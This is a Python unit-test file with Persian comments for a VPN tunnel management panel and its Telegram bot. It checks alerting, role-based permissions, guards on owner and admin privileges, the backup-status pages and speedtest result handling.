        self.assertIn("CPU", events[0][1])
        # بالا ماندن: بدونِ تکرار
        mon._check_resources()
        self.assertEqual(len(events), 1)
        # برگشت به زیرِ آستانه → پیامِ رفعِ هشدار
        cur["cpu"] = 20.0
        mon._check_resources()
        self.assertEqual(len(events), 2)
        # snapshot ِ خالی/ناقص نباید exception بدهد
        m.SYSMON = types.SimpleNamespace(snapshot=lambda: {})
        mon._check_resources()

    def test_warp_alerts(self):
        """هشدارِ WARP: قطعِ تونل، ناهمخوانیِ خروج، افتِ حساب — لبه‌یاب."""
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True}
        sent = []
        m.ALERTS.emit = lambda t: sent.append(t)
        m.ALERTS.state.clear()
        mon = m.AlertMonitor()
        # وضعیتِ سالمِ اولیه (prev=None → بی‌صدا، فقط ثبتِ state)
        base = {"installed": True,
                "iface": {"up": True, "handshake_age": 20},
                "egress_actual": "wg22", "egress_want": "wg22",
                "account": "unlimited"}
        m.warp_status = lambda force=False: dict(base)
        mon._check_warp()
        self.assertEqual(sent, [])
        # تونل می‌میرد → هشدار
        m.warp_status = lambda force=False: dict(
            base, iface={"up": True, "handshake_age": 300})
        mon._check_warp()
        self.assertTrue(any("قطع" in s for s in sent))
        sent.clear()
        # خروج به awg1 می‌افتد → هشدارِ ناهمخوانی (تونل هم دوباره سالم شد)
        m.warp_status = lambda force=False: dict(
            base, egress_actual="awg1")
        mon._check_warp()
        self.assertTrue(any("خروجِ WARP" in s for s in sent))
        sent.clear()
        # حساب از unlimited می‌افتد → هشدار
        m.warp_status = lambda force=False: dict(base, account="free")
        mon._check_warp()
        self.assertTrue(any("unlimited" in s for s in sent))
        sent.clear()
        # نصب‌نشده → هیچ هشداری
        m.warp_status = lambda force=False: {"installed": False}
        mon._check_warp()
        self.assertEqual(sent, [])
        # دسته خاموش → هیچ هشداری حتی با تونلِ مرده
        m.CONFIG["alerts"] = {"enabled": True, "events": {"warp": False}}
        m.warp_status = lambda force=False: dict(
            base, iface={"up": False, "handshake_age": None})
        m.ALERTS.state.clear()
        mon._check_warp()
        self.assertEqual(sent, [])

    def test_warp_in_event_catalog(self):
        self.assertIn("warp", self.m.ALERT_EVENT_KEYS)

    def test_alert_event_respects_toggle(self):
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True, "events": {"tunnel": False}}
        sent = []
        m.ALERTS.emit = lambda t: sent.append(t)
        m.ALERTS.event("tunnel", "x")      # این دسته خاموش
        m.ALERTS.event("login", "y")       # این روشن
        self.assertEqual(sent, ["y"])

    def test_alert_disabled_blocks_emit(self):
        m = self.m
        m.CONFIG["alerts"] = {"enabled": False}
        sent = []
        # emit واقعی: باید چون enabled=False چیزی صف نشود
        m.ALERTS.q = __import__("queue").Queue()
        m.ALERTS.emit("z")
        self.assertTrue(m.ALERTS.q.empty())

    def test_send_now_requires_token(self):
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True, "bot_token": "", "chat_id": ""}
        ok, detail = m.ALERTS.send_now("hi")
        self.assertFalse(ok)

    def test_check_tunnels_no_format_error(self):
        """رگرسیون: پیامِ تونلِ «وصل» فقط یک %s دارد؛ نباید TypeErrorِ
        فرمت‌بندی بدهد (باگی که در اجرای زنده دیده شد)."""
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True}
        sent = []
        m.ALERTS.emit = lambda t: sent.append(t)
        m.ALERTS.state.clear()
        mon = m.AlertMonitor()
        # هر دو حالت را با کش‌های ساختگیِ TUNNELS بسنج
        m.TUNNELS.data = {"wg21": {"systemd": "failed", "endpoint": ""}}
        mon._check_tunnels()          # اولین‌بار: ثبتِ وضعیت، بی‌صدا
        m.TUNNELS.data = {"wg21": {"systemd": "active", "endpoint": ""}}
        mon._check_tunnels()          # تغییر به «وصل» → باید پیام بسازد بی‌خطا
        m.TUNNELS.data = {"wg21": {"systemd": "failed", "endpoint": ""}}
        mon._check_tunnels()          # تغییر به «قطع»
        self.assertEqual(len(sent), 2)
        self.assertTrue(any("وصل" in s for s in sent))
        self.assertTrue(any("قطع" in s for s in sent))


class BotTests(unittest.TestCase):
    """رباتِ تلگرام: auth نقش‌محور، رندرِ PNG، فرمت‌بندی."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_bot_user_role_and_perms(self):
        m = self.m
        m.CONFIG["bot"] = {"enabled": True, "users": [
            {"id": "111", "role": "admin"},
            {"id": "222", "role": "viewer"}]}
        self.assertEqual(m.bot_user_role("111"), "admin")
        self.assertEqual(m.bot_user_role(222), "viewer")   # عدد هم بپذیرد
        self.assertIsNone(m.bot_user_role("999"))          # غریبه
        self.assertIsNone(m.bot_perms("999"))
        self.assertEqual(m.bot_perms("111"), set(m.ALL_PERMS))
        self.assertEqual(m.bot_perms("222"), set(m.VIEWER_PERMS))

    def test_bot_perms_custom_role(self):
        m = self.m
        m.CONFIG["roles"] = {"pxop": {"perms": ["proxy.add"],
                                      "require_totp": False}}
        m.CONFIG["bot"] = {"enabled": True,
                           "users": [{"id": "5", "role": "pxop"}]}
        p = m.bot_perms("5")
        self.assertIn("proxy.add", p)
        self.assertIn("proxy.view", p)          # ضمنی
        self.assertNotIn("wg.add", p)

    def test_bot_manage_users_in_bot(self):
        """مدیریتِ کاربرانِ ربات از داخلِ ربات: افزودن، تغییرِ نقش، حذف،
        و گاردِ ضدخودقفلی (نتوان نقش/حذفِ خود را عوض کرد)."""
        m = self.m
        m.CONFIG["users"] = [{"username": "admin", "salt": "a" * 32,
                              "hash": "h", "role": "admin", "totp": "",
                              "stoken": "t"}]
        m.CONFIG["bot"] = {"enabled": True,
                           "users": [{"id": "100", "role": "admin",
                                      "name": "من"}]}
        sent = []
        bot = m.BOT
        bot.send = lambda chat, text, kb=None: sent.append(text)
        bot.send_photo = lambda *a, **k: None
        admin = 100      # دارای bot.manage
        # افزودنِ کاربرِ جدید با نقشِ viewer
        bot._bu_add_user(admin, admin, "555", "viewer")
        self.assertEqual(m.bot_user_role("555"), "viewer")
        # ارتقا به admin
        bot._bu_set_role(admin, admin, "555", "admin")
        self.assertEqual(m.bot_user_role("555"), "admin")
        # نقشِ نامعتبر → تغییری نکند
        bot._bu_set_role(admin, admin, "555", "ghostrole")
        self.assertEqual(m.bot_user_role("555"), "admin")
        # گاردِ ضدخودقفلی: نتوان نقشِ خود را عوض کرد
        bot._bu_set_role(admin, admin, "100", "viewer")
        self.assertEqual(m.bot_user_role("100"), "admin")
        # گاردِ ضدخودقفلی: نتوان خود را حذف کرد (مسیرِ _apply_bu)
        bot._apply_bu(admin, admin, {"uid": "100"})
        self.assertEqual(m.bot_user_role("100"), "admin")
        # حذفِ دیگری
        bot._apply_bu(admin, admin, {"uid": "555"})
        self.assertIsNone(m.bot_user_role("555"))
        # آیدیِ غیرعددی رد شود
        n_before = len(m.bot_cfg()["users"])
        bot._bu_add_user(admin, admin, "abc", "viewer")
        self.assertEqual(len(m.bot_cfg()["users"]), n_before)
        # ---- نقشِ «مالک ربات» (owner): دسترسیِ کامل + تغییرناپذیر/حذف‌ناشدنی
        self.assertEqual(m.role_perms("owner"), set(m.ALL_PERMS))
        self.assertEqual(bot._bu_role_label("owner"), "مالک ربات")
        m.CONFIG["bot"]["users"].append({"id": "900", "role": "owner",
                                         "name": "مالک"})
        # مدیرِ دیگر نتواند نقشِ مالک را عوض کند
        bot._bu_set_role(admin, admin, "900", "viewer")
        self.assertEqual(m.bot_user_role("900"), "owner")
        # مدیرِ دیگر نتواند مالک را حذف کند (هر دو لایه)
        bot._bu_confirm_del(admin, admin, "900")
        self.assertNotIn(admin, bot.convo)          # تأییدِ حذف اصلاً باز نشد
        bot._apply_bu(admin, admin, {"uid": "900"})
        self.assertEqual(m.bot_user_role("900"), "owner")
        # نقشِ owner از داخلِ ربات قابلِ تخصیص نیست (در فهرستِ نقش‌ها نیست)
        self.assertNotIn("owner", bot._bu_roles())

    def test_bot_tun_list_honest_health(self):
        """فهرستِ تونل‌های ربات: سلامتِ صادقانه (نه systemd)، بدترین اول،
        تگِ AWG و بوت — هم‌ترازِ جدولِ پنل (کامیت ۸۲)."""
        m = self.m
        sent = []
        bot = m.BOT
        bot.send = lambda chat, text, kb=None: sent.append(text)
        orig = m.build_stats
        m.build_stats = lambda: {"tunnels": [
            {"iface": "awg1", "health": "healthy", "kind": "amneziawg",
             "enabled": True, "rx_rate": 500 * 1024, "tx_rate": 0},
            {"iface": "wg21", "health": "dead", "kind": "wireguard",
             "enabled": False, "rx_rate": 0, "tx_rate": 0},
            {"iface": "wg22", "health": "idle", "kind": "wireguard",
             "enabled": True, "rx_rate": 0, "tx_rate": 0}]}
        try:
            bot._tun_list(1)
        finally:
            m.build_stats = orig
        txt = sent[-1]
        self.assertIn("مرده", txt)
        self.assertIn("AWG", txt)
        self.assertIn("بوتِ دستی", txt)
        self.assertIn("بوتِ خودکار", txt)
        # بدترین اول: wg21 (مرده) باید قبل از awg1 (سالم) بیاید
        self.assertLess(txt.index("wg21"), txt.index("awg1"))
        # شمارنده‌ها: ۲ زنده (healthy+idle)، ۱ مشکل‌دار
        self.assertIn("زنده:", txt)

    def test_bot_ecmp_page_and_toggle(self):
        """صفحه‌ی گاردِ ECMP در ربات + روشن/خاموش با تأیید؛ تغییر فقط مالک."""
        m = self.m
        m.CONFIG["users"] = [{"username": "admin", "salt": "a" * 32,
                              "hash": "h", "role": "admin", "totp": "",
                              "stoken": "t"}]
        m.CONFIG["bot"] = {"enabled": True, "users": [
            {"id": "100", "role": "owner"},
            {"id": "150", "role": "admin"},
            {"id": "200", "role": "viewer"}]}
        m.CONFIG["ecmp_guard"] = {
            "enabled": True, "dead_after": 150, "confirm": 2,
            "groups": [{"name": "گوگل", "routes_file": "/tmp/g.txt",
                        "tunnels": ["wg21", "wg22"], "weight": 5,
                        "table": "main", "enabled": True}]}
        sent = []
        bot = m.BOT
        bot.send = lambda chat, text, kb=None: sent.append((text, kb))
        m.live_interfaces = lambda: ["wg21"]
        now = m.time.time()
        m.SAMPLER.snapshot = lambda: {"peers": [
            {"iface": "wg21", "handshake": int(now - 5)}]}
        m.ECMPGUARD.membership = {("گوگل", "wg21"): "in"}
        # صفحه: گروه + سلامتِ زنده + عضویت
        bot._ecmp_page(1)
        txt = sent[-1][0]
        self.assertIn("گوگل", txt)
        self.assertIn("سالم", txt)          # wg21 زنده
        self.assertIn("در مسیر", txt)       # عضویتِ nexthop
        self.assertIn("خاموش", txt)         # wg22 پایین است
        # گیتِ RBAC در دیسپچ: viewer (بدونِ ecmp.manage) هیچ پاسخی نگیرد
        sent.clear()
        bot._on_action(200, 200, "ec:page")
        self.assertEqual(sent, [])
        import json as _json
        # ادمینِ ربات (غیرمالک): صفحه را می‌بیند ولی دکمه/امکانِ toggle ندارد
        sent.clear()
        bot._on_action(150, 150, "ec:page")
        txt150, kb150 = sent[-1]
        self.assertIn("فقط در اختیارِ مالکِ ربات", txt150)
        self.assertNotIn("ec:toggle",
                         _json.dumps(kb150, ensure_ascii=False))
        bot._on_action(150, 150, "ec:toggle")          # درخواستِ مستقیم → رد
        self.assertNotIn(150, bot.convo)
        self.assertTrue(m.CONFIG["ecmp_guard"]["enabled"])
        # دفاعِ دوم: حتی state تأییدشده هم برای غیرمالک اجرا نمی‌شود
        bot._apply_ecmp(150, 150, {"to_on": False})
        self.assertTrue(m.CONFIG["ecmp_guard"]["enabled"])
        # مالک: دکمه‌ی toggle را دارد
        sent.clear()
        bot._on_action(100, 100, "ec:page")
        self.assertIn("ec:toggle", _json.dumps(sent[-1][1],
                                               ensure_ascii=False))
        # خاموش‌کردن با تأیید (فقط مالک)
        bot._on_action(100, 100, "ec:toggle")
        self.assertEqual(bot.convo[100]["kind"], "ec")
        bot._on_confirm(100, 100, True)
        self.assertFalse(m.CONFIG["ecmp_guard"]["enabled"])
        self.assertEqual(m.ECMPGUARD.membership, {})   # حافظه پاک شد
        # روشن‌کردنِ دوباره
        bot._on_action(100, 100, "ec:toggle")
        bot._on_confirm(100, 100, True)
        self.assertTrue(m.CONFIG["ecmp_guard"]["enabled"])
        # روشن‌کردن وقتی هیچ گروهِ فعالی نیست → رد، بدونِ تغییر
        m.CONFIG["ecmp_guard"]["enabled"] = False
        m.CONFIG["ecmp_guard"]["groups"][0]["enabled"] = False
        sent.clear()
        bot._on_action(100, 100, "ec:toggle")
        self.assertNotIn(100, bot.convo)               # تأیید اصلاً باز نشد
        self.assertFalse(m.CONFIG["ecmp_guard"]["enabled"])
        self.assertIn("گروهِ فعال", sent[-1][0])

    def test_bot_px_dests_page(self):
        """صفحه‌ی «مقصدها»ی کاربرِ پروکسی در ربات: سلامت/شمارش/حجم با
        ارقامِ فارسی، صفحه‌بندی، و حالتِ خالی."""
        m = self.m
        bot = m.BOT
        sent = []
        bot.send = lambda chat, text, kb=None: sent.append((text, kb))
        now = m.time.time()
        fake = [{"host": "push.webexconnect.com", "first_seen": now - 9000,
                 "last_seen": now - 60, "hits": 2938, "ok": 2938, "fail": 0,
                 "bytes": 12_900_000},
                {"host": "idbroker.webex.com", "first_seen": now - 9000,
                 "last_seen": now - 600, "hits": 18, "ok": 17, "fail": 1,
                 "bytes": 207_000}] + [
                {"host": "h%d.example.com" % i, "first_seen": now,
                 "last_seen": now - 1000 - i, "hits": 1, "ok": 1, "fail": 0,
                 "bytes": 100} for i in range(8)]
        m.META.proxy_dests = lambda u, limit=500: fake if u == "nakucm" else []
        bot._px_dests(1, "nakucm")
        txt, kb = sent[-1]
        self.assertIn("مقصدهای کاربرِ پروکسی", txt)
        self.assertIn("push.webexconnect.com", txt)
        self.assertIn("سالم", txt)
        self.assertIn("۱ خطا", txt)                      # مقصدِ خطادار
        self.assertIn("۲۹۳۸", txt)                       # ارقامِ فارسی
        self.assertIn("۱۲٫۳ MB", txt)                    # حجمِ فارسی
        # صفحه‌بندی: ۱۰ مقصد با ۶تایی → ۲ صفحه، دکمه‌ی قدیمی‌تر
        self.assertIn("صفحهٔ ۱ از ۲", txt)
        flat = [b["callback_data"] for row in kb for b in row
                if "callback_data" in b]
        self.assertIn("px:dst:nakucm|1", flat)
        bot._px_dests(1, "nakucm", page=1)
        self.assertIn("صفحهٔ ۲ از ۲", sent[-1][0])
        # حالتِ خالی
        bot._px_dests(1, "ghost")
        self.assertIn("مقصدی ثبت نشده", sent[-1][0])

    def test_bot_backup_page(self):
        """صفحه‌ی «وضعیت پشتیبان‌گیری» ربات: گیتِ audit.view، ساختِ متن از
        state (سالم/کهنه)، دکمه‌ی کپی sha256، و نبودِ فراخوانیِ شبکه."""
        m = self.m
        import json as _json
        m.CONFIG["bot"] = {"enabled": True, "users": [
            {"id": "1", "role": "admin"}, {"id": "2", "role": "viewer"}]}
        bot = m.BOT
        sent = []
        bot.send = lambda chat, text, kb=None: sent.append((text, kb))
        # viewer (بدونِ audit.view) → رد
        bot._backup_page(2, m.bot_perms("2"))
        self.assertIn("مجوزِ این بخش", sent[-1][0])
        # state: پنل تازه و تأییدشده، سرور کهنه
        sp = os.path.join(self.tmp, "bstate.json")
        m.BACKUP_STATE_PATH = sp
        now = m.time.time()
        with open(sp, "w") as f:
            _json.dump({"panel": {"object": "wg-panel-x.tar.gz",
                                  "sha256": "ab" * 32, "size": 336278,
                                  "uploaded": now - 3600, "verified": True},
                        "full": {"object": "myserver-y.tar.gz",
                                 "sha256": "cd" * 32, "size": 300000000,
                                 "uploaded": now - 40 * 3600, "verified": True}},
                       f)
        bot._backup_page(1, m.bot_perms("1"))
        txt, kb = sent[-1]
        self.assertIn("وضعیتِ پشتیبان‌گیری", txt)
        self.assertIn("سالم — MEGA، sha256 تأییدشده", txt)   # پنل
        self.assertIn("کهنه (بیش از ۳۶ ساعت)", txt)          # سرور
        self.assertIn("wg-panel-x.tar.gz", txt)
        self.assertIn("ab" * 32, txt)                        # sha256 کامل
        self.assertIn("ندارد (طبقِ سیاست)", txt)             # بدونِ نسخه‌ی محلی
        # دو دکمه‌ی کپی sha256 (پنل و سرور) + منو
        copies = [b for row in kb for b in row if "copy_text" in b]
        self.assertEqual(len(copies), 2)
        self.assertEqual(copies[0]["copy_text"]["text"], "ab" * 32)

    def test_speedtest(self):
        """تستِ سرعت: پارسِ خروجیِ ookla، فهرستِ اینترفیس‌ها، ذخیره/خواندنِ
        DB، و مجوزهای endpointها (اجرا فقط svc.edit)."""
        m = self.m
        # پارسِ json (خطِ type=result بینِ خطوطِ دیگر)
        out = ('{"type":"log","message":"x"}\n'
               '{"type":"result","ping":{"latency":95.3},'
               '"download":{"bandwidth":72974329},'
               '"upload":{"bandwidth":108518678}}\n')
        d = m.SpeedTester._parse_result(out)
        self.assertEqual(d["ping"]["latency"], 95.3)
        self.assertIsNone(m.SpeedTester._parse_result("garbage\n"))
        # فهرستِ اینترفیس‌ها از ip -br (بدونِ lo، بدونِ @)
        real_run = m.run
        m.run = lambda cmd, timeout=20: (0,
            "lo   UNKNOWN 127.0.0.1/8\n"
            "eth0 UP      1.2.3.4/29\n"
            "tunl0@NONE DOWN \n"
            "wgx18@NONE UNKNOWN 192.168.1.12/31\n", "")
        try:
            self.assertEqual(m.SpeedTester.ifaces(), ["eth0", "wgx18"])
            # محدودسازی با speedtest_ifaces (طبقِ خواستِ کاربر: فقط awg1)
            m.CONFIG["speedtest_ifaces"] = ["wgx18"]
            self.assertEqual(m.SpeedTester.ifaces(), ["wgx18"])
            # اینترفیسِ خواسته‌شده‌ی غایب هم برمی‌گردد تا خطایش ثبت شود
            m.CONFIG["speedtest_ifaces"] = ["awg9"]
            self.assertEqual(m.SpeedTester.ifaces(), ["awg9"])
            del m.CONFIG["speedtest_ifaces"]
        finally:
            m.run = real_run
        # ذخیره و خواندن از DB (sqlite واقعی) + ستون‌های jitter/loss/url
        m.META.speedtest_add({"ts": 1.0, "iface": "eth0", "server_id": 3744,
                              "ping_ms": 95.3, "down_bps": 583794632.0,
                              "up_bps": 868149424.0, "ok": 1, "error": "",
                              "jitter_ms": 0.5, "loss_pct": 0.0,
                              "url": "https://sp.net/r/x"})
        m.META.speedtest_add({"ts": 2.0, "iface": "eth1", "server_id": 3744,
                              "ping_ms": None, "down_bps": None,
                              "up_bps": None, "ok": 0,
                              "error": "Network is unreachable"})
        rows = m.META.speedtest_recent(10)
        self.assertEqual(len(rows), 2)
        self.assertEqual(rows[0]["iface"], "eth1")     # جدیدترین اول
        self.assertFalse(rows[0]["ok"])
        self.assertTrue(rows[1]["ok"])
        self.assertAlmostEqual(rows[1]["down_bps"], 583794632.0)
        self.assertEqual(rows[1]["jitter_ms"], 0.5)
        self.assertEqual(rows[1]["url"], "https://sp.net/r/x")
        # میانگین ۷روزه (فقط ردیف‌های موفق) — با ts در بازه‌ی هفت روز
        now = m.time.time()
        for i, dn in enumerate((400e6, 420e6, 380e6)):
            m.META.speedtest_add({"ts": now - 3600 * (i + 2), "iface": "awg1",
                                  "server_id": 3744, "ping_ms": 60.0,
                                  "down_bps": dn, "up_bps": dn, "ok": 1,
                                  "error": ""})
        avg_dn, avg_up, cnt = m.META.speedtest_avg("awg1", days=7)
        self.assertEqual(cnt, 3)
        self.assertAlmostEqual(avg_dn, 400e6, delta=1)
        # هشدارِ افتِ سرعت: <۵۰٪ میانگین → متن؛ نزدیکِ میانگین → None
        bad = {"ts": now, "iface": "awg1", "ok": 1,
               "down_bps": 150e6, "up_bps": 390e6}
        txt = m.SpeedTester.drop_alert_text(bad)
        self.assertIsNotNone(txt)
        self.assertIn("افتِ سرعتِ", txt)
        self.assertIn("دانلود", txt)
        good = {"ts": now, "iface": "awg1", "ok": 1,
                "down_bps": 390e6, "up_bps": 410e6}
        self.assertIsNone(m.SpeedTester.drop_alert_text(good))
        # کمتر از ۳ نمونه‌ی قبلی → هشدارِ کاذب نده
        self.assertIsNone(m.SpeedTester.drop_alert_text(
            {"ts": now, "iface": "eth0", "ok": 1,
             "down_bps": 1e6, "up_bps": 1e6}))
        # پنجره‌ی بکاپ: ۳ تا ۵ بامداد → اجرای خودکار ممنوع
        self.assertTrue(m.SpeedTester.in_backup_window(hour=4))
        self.assertFalse(m.SpeedTester.in_backup_window(hour=13))
        # مجوزِ endpoint تنظیمات
        self.assertEqual(m.Handler.PERM_MAP["/api/speedtest/config"],
                         "svc.edit")
        # رویدادِ هشدارِ speedtest تعریف شده باشد
        self.assertIn("speedtest", m.ALERT_EVENT_KEYS)
        # مجوزها: نمایش sys.view؛ اجرا/لغو فقط svc.edit
        self.assertEqual(m.Handler.PERM_MAP["/api/speedtest/status"],
                         "sys.view")
        self.assertEqual(m.Handler.PERM_MAP["/api/speedtest/run"], "svc.edit")
        self.assertEqual(m.Handler.PERM_MAP["/api/speedtest/cancel"],
                         "svc.edit")
        # شناسه‌ی سرور: پیش‌فرض ۳۷۴۴ + قابلِ‌تنظیم از config
        self.assertEqual(m.SpeedTester.server_id(), 3744)
        m.CONFIG["speedtest_server"] = "1234"
        self.assertEqual(m.SpeedTester.server_id(), 1234)
        del m.CONFIG["speedtest_server"]
        # قفلِ اجرا هنگامِ running
        m.SPEEDTEST.state["running"] = True
        self.assertFalse(m.SPEEDTEST.start())
        m.SPEEDTEST.state["running"] = False
        # زمان‌بندِ خودکار (دو بار در شبانه‌روز) — مستقل از ساعتِ واقعی:
        # پنجره‌ی بکاپ را موقتاً خنثی می‌کنیم تا فقط منطقِ ۱۲ساعته سنجیده شود
        real_win = m.SpeedTester.in_backup_window
        m.SpeedTester.in_backup_window = staticmethod(lambda hour=None: False)
        try:
            # جدیدترین ردیفِ DB الان ~۲ ساعت پیش است → موعد نرسیده
            self.assertFalse(m.SPEEDTEST.auto_due())
            # ردیفِ تازه‌تر از ۱۲ ساعت پیش را با ردیفِ قدیمی جایگزین کن:
            # (درج ردیفِ جدیدتر با ts قدیمی کافی نیست چون ORDER BY id است؛
            # پس ردیفِ «جدیدترین» را قدیمی درج می‌کنیم)
            m.META.speedtest_add({"ts": m.time.time() - 13 * 3600,
                                  "iface": "awg1", "server_id": 3744,
                                  "ping_ms": 60.0, "down_bps": 1e8,
                                  "up_bps": 1e8, "ok": 1, "error": ""})
            self.assertTrue(m.SPEEDTEST.auto_due())    # ≥۱۲ ساعت گذشته
            m.SPEEDTEST.state["running"] = True
            self.assertFalse(m.SPEEDTEST.auto_due())   # حینِ اجرا هرگز
            m.SPEEDTEST.state["running"] = False
        finally:
            m.SpeedTester.in_backup_window = real_win

    def test_backup_full_status(self):
        """وضعیت پشتیبان‌گیری برای پنل وب: ساختار خروجی + پارس زمان systemd
        + ثبت endpoint در PERM_MAP با مجوز audit.view."""
        m = self.m
        ts = m._sysd_ts("Sun 2026-07-19 04:56:47 +0330")
        self.assertIsNotNone(ts)
        self.assertIsNone(m._sysd_ts("n/a"))
        self.assertIsNone(m._sysd_ts(""))
        st = m.backup_full_status()
        self.assertEqual([a["label"] for a in st["archives"]],
                         ["پنل", "سرور (کامل)"])
        self.assertEqual(len(st["units"]), 4)
        self.assertEqual(st["units"][2]["unit"], "wg-panel-s4-upload")
        for u in st["units"]:
            self.assertIn("last", u)
            self.assertIn("next", u)
        self.assertIn("s4", st)          # حتی بدون env، ساختار برمی‌گردد
        self.assertEqual(m.Handler.PERM_MAP["/api/backup/status"],
                         "audit.view")
        # سیاستِ MEGA-محور: state آپلودِ تأییدشده ملاکِ سلامت است
        import json as _json
        sp = os.path.join(self.tmp, "bstate.json")
        m.BACKUP_STATE_PATH = sp
        with open(sp, "w") as f:
            _json.dump({"panel": {"uploaded": m.time.time() - 3600,
                                  "verified": True, "sha256": "aa", "size": 5,
                                  "object": "wg-panel-x.tar.gz"},
                        "full": {"uploaded": m.time.time() - 40 * 3600,
                                 "verified": True}}, f)
        rows = m._backup_status()
        self.assertIn("MEGA", rows[0][1])
        self.assertFalse(rows[0][2])          # تازه → سالم
        self.assertTrue(rows[1][2])           # ۴۰ ساعت → کهنه
        st2 = m.backup_full_status()
        self.assertTrue(st2["archives"][0]["remote"].get("verified"))
        self.assertEqual(st2["archives"][0]["remote"]["object"],
                         "wg-panel-x.tar.gz")
        self.assertIn("s4_full", st2)
        # بدونِ state (فایلِ خراب) → fallback بدونِ خطا
        pathlib.Path(sp).write_text("{bad json")
        self.assertEqual(m._backup_state(), {})
        # SHA256 با کش (کلید mtime/size) + مسیرِ نبودِ فایل
        p = os.path.join(self.tmp, "x.bin")
        with open(p, "wb") as f:
            f.write(b"abc")
        want = ("ba7816bf8f01cfea414140de5dae2223"
                "b00361a396177a9cb410ff61f20015ad")
        self.assertEqual(m._file_sha256_cached(p), want)
        self.assertEqual(m._file_sha256_cached(p), want)   # از کش
        self.assertIn(p, m._SHA_CACHE)
        self.assertEqual(m._file_sha256_cached(p + ".nope"), "")

    def test_bot_watch_owner_only(self):
        """پایشِ کاربرانِ ربات: فقط مالک می‌بیند؛ همه‌ی کارهای کاربران —
        adminِ ربات، خودِ مالک و پنلِ وب — می‌آید؛ رویدادِ خودکارِ سیستم نه."""
        m = self.m
        m.CONFIG["bot"] = {"enabled": True, "users": [
            {"id": "1", "role": "owner", "name": "مالک"},
            {"id": "2", "role": "admin", "name": "ادمین"}]}
        bot = m.BOT
        sent = []
        bot.send = lambda chat, text, kb=None: sent.append((text, kb))
        # admin (و هر غیرمالکی) دسترسی ندارد
        bot._bot_watch(2, 2)
        self.assertIn("فقط برای مالکِ ربات", sent[-1][0])
        # چهار رویداد: adminِ ربات، خودِ مالک، پنلِ وب، و خودکارِ سیستم
        m.audit("bot:2", "peer", "افزودن کاربر (ربات)", "u1 @ wg1udp",
                "IP=10.0.0.2")
        m.audit("bot:1", "peer", "حذف کاربر (ربات)", "u2 @ wg1udp", "")
        m.audit("admin", "peer", "افزودن کاربر", "u3 @ wg1udp", "")
        m.audit("سیستم (اعمال سیاست)", "peer", "غیرفعال‌سازی خودکار",
                "u4 @ wg1udp", "")
        bot._bot_watch(1, 1)
        txt = sent[-1][0]
        self.assertIn("پایشِ کاربرانِ ربات", txt)
        self.assertIn("u1 @ wg1udp", txt)           # کارِ adminِ ربات
        self.assertIn("IP=10.0.0.2", txt)           # ریزِ جزئیات
        self.assertIn("u2 @ wg1udp", txt)           # کارِ خودِ مالک هم بیاید
        self.assertIn("مالک ربات", txt)
        self.assertIn("u3 @ wg1udp", txt)           # کارِ پنلِ وب هم بیاید
        self.assertIn("پنلِ وب", txt)
        self.assertNotIn("u4", txt)                 # خودکارِ سیستم نیاید
        # کاربرِ حذف‌شده از ربات: کارهایش همچنان دیده شود (با برچسب)
        m.CONFIG["bot"]["users"] = [u for u in m.CONFIG["bot"]["users"]
                                    if u["id"] != "2"]
        bot._bot_watch(1, 1)
        txt = sent[-1][0]
        self.assertIn("u1 @ wg1udp", txt)
        self.assertIn("حذف‌شده از ربات", txt)

    def test_bot_owner_immutable_from_panel(self):
        """گاردِ bot_owner_violation (پشتِ /api/bot/save): هیچ تغییری روی
        ردیفِ مالک از پنل ممکن نیست؛ نقشِ سفارشیِ هم‌نامِ owner هم بی‌اثر."""
        m = self.m
        m.CONFIG["bot"] = {"enabled": True, "users": [
            {"id": "700000001", "role": "owner", "name": "مالک"},
            {"id": "500", "role": "admin", "name": ""}]}
        base = {"id": "700000001", "role": "owner", "name": "مالک"}
        # تغییر/حذفِ کاربرِ غیرمالک آزاد است (مالک عیناً سرِ جایش)
        self.assertIsNone(m.bot_owner_violation(
            [dict(base), {"id": "500", "role": "viewer", "name": "x"}]))
        bad_lists = [
            [{"id": "500", "role": "admin", "name": ""}],           # حذفِ مالک
            [{"id": "700000001", "role": "admin", "name": "مالک"}],  # تنزلِ نقش
            [{"id": "700000001", "role": "owner", "name": "دیگر"}],  # تغییرِ نام
            [dict(base), {"id": "999", "role": "owner", "name": ""}],  # مالکِ دوم
            [dict(base), {"id": "700000001", "role": "admin",
                          "name": ""}],                             # ردیفِ تکراری
        ]
        for lst in bad_lists:
            self.assertIsNotNone(m.bot_owner_violation(lst), lst)
        # نقشِ سفارشیِ هم‌نامِ «owner» نه قابلِ‌تخصیص از ربات است نه
        # قدرتِ مالک را ضعیف می‌کند (role_perms اول owner را چک می‌کند)
        m.CONFIG["roles"] = {"owner": {"perms": ["wg.view"],
                                       "require_totp": False}}
        self.assertNotIn("owner", m.BOT._bu_roles())
        self.assertEqual(m.role_perms("owner"), set(m.ALL_PERMS))

    def test_bot_admin_grant_needs_full_admin(self):
        """ضدِ ارتقای دسترسی: دارنده‌ی صرفِ bot.manage نباید بتواند کسی را
        «مدیرِ ربات» کند (نقشِ admin همه‌ی مجوزها را دارد)."""
        m = self.m
        m.CONFIG["roles"] = {"helper": {"perms": ["bot.manage"],
                                        "require_totp": False}}
        m.CONFIG["bot"] = {"enabled": True, "users": [
            {"id": "1", "role": "owner", "name": "مالک"},
            {"id": "2", "role": "admin", "name": ""},
            {"id": "3", "role": "helper", "name": ""},
            {"id": "4", "role": "viewer", "name": ""}]}

        # --- سمتِ پنل (/api/bot/save) ---
        cur = [dict(u) for u in m.CONFIG["bot"]["users"]]
        # ادمینِ کامل: هر تخصیصی مجاز
        self.assertIsNone(m.bot_admin_grant_violation(
            cur + [{"id": "9", "role": "admin", "name": ""}], True))
        # غیرادمین: adminِ تازه ممنوع
        self.assertIsNotNone(m.bot_admin_grant_violation(
            cur + [{"id": "9", "role": "admin", "name": ""}], False))
        # غیرادمین: ارتقای viewer موجود به admin ممنوع
        promoted = [dict(u, role="admin") if u["id"] == "4" else dict(u)
                    for u in cur]
        self.assertIsNotNone(m.bot_admin_grant_violation(promoted, False))
        # غیرادمین: adminِ از قبل موجودِ دست‌نخورده، ذخیره را نمی‌شکند
        self.assertIsNone(m.bot_admin_grant_violation(cur, False))

